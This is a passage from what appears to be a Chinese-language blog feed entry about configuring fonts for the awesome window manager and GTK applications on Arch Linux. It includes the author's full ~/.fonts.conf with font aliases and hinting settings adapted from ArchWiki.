&lt;li&gt;英數字型我慣用 &lt;code&gt;Monaco&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這幾天剛用 awesome window manager&lt;br /&gt;
一直在想辦法讓預設的字型變好看  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;在 &lt;code&gt;~/.config/awesome/rc.lua&lt;/code&gt; 中，加入 &lt;code&gt;awesome.font = "LiHei Pro 12"&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;~/.config/awesome/themes/default/theme.lua&lt;/code&gt; 中，加入 &lt;code&gt;theme.font = "LiHei Pro 10"&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了這兩個之外 其他以 gtk 開啟的程式預設字型真的很醜= ="&lt;br /&gt;
找了好多篇文章 最後發現應該加上 &lt;code&gt;~/.fonts.conf&lt;/code&gt; 就行了&lt;br /&gt;
參考了以下這三篇 Archwiki 的 section 之後  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Fonts#Fallback_font_order_with_X11"&gt;Fonts - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Font_configuration/Examples"&gt;Font configuration/Examples - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Chromium#Font_Rendering"&gt;Chromium - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我的 &lt;code&gt;~/.fonts.conf&lt;/code&gt; 目前長這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;  
&lt;span class="cp"&gt;&amp;lt;!DOCTYPE fontconfig SYSTEM &amp;quot;fonts.dtd&amp;quot;&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;fontconfig&amp;gt;&lt;/span&gt;  
&lt;span class="c"&gt;&amp;lt;!-- set font --&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;alias&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;serif&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Monaco&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;LiHei Pro&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/alias&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;alias&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Sans-serif&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Monaco&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;LiHei Pro&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/alias&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;alias&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;monospace&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Monaco&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/alias&amp;gt;&lt;/span&gt;  

&lt;span class="c"&gt;&amp;lt;!-- Chromium fonts rendering from archwiki-chromium --&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;autohint&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hinting&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintslight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="c"&gt;&amp;lt;!-- make the font looks perfect from  &lt;/span&gt;
&lt;span class="c"&gt;tps://wiki.archlinux.org/index.php/Font_Configuration/fontconfig_Examples --&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;autohint&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hinting&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;   &lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;false&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcddefault&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintslight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;antialias&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;rgba&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;      &lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;rgb&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;test&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pixelsize&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;qual=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;any&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;compare=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;more&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;double&amp;gt;&lt;/span&gt;15&lt;span class="nt"&gt;&amp;lt;/double&amp;gt;&amp;lt;/test&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcdlight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintnone&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;test&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;weight&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;compare=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;more&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;medium&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/test&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintnone&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcdlight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;test&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;slant&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;compare=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;not_eq&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;double&amp;gt;&lt;/span&gt;0&lt;span class="nt"&gt;&amp;lt;/double&amp;gt;&amp;lt;/test&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintnone&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcdlight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/fontconfig&amp;gt;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;結果這些都弄完了以後 發現有些地方還是沒改到...  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Error" src="/files/font-config-in-arch-linux/error.png" /&gt;  &lt;/p&gt;
&lt;p&gt;這我真的不知道要怎麼改了Orz  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Fonts#Fallback_font_order_with_X11"&gt;Fonts - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Font_configuration/Examples"&gt;Font configuration/Examples - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Chromium#Font_Rendering"&gt;Chromium - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="awesomewm"></category><category term="font"></category></entry></feed>